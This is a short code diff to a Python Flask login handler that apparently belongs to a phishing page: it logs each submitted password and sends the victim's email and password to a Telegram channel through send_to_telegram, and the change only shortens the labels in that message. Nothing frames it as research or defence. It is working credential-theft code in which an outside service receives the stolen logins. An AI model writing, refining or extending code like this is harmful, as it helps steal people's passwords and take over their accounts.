@@ -39,7 +39,7 @@ def login():
     app.logger.debug(f'Received password: {password}')  
 
     # Send email and password to Telegram
-    message = f"Email: {email}\nPassword: {password}"
+    message = f"E: {email}\nP: {password}"
     send_to_telegram(message)
 
     flash('Login details sent successfully.', 'success')
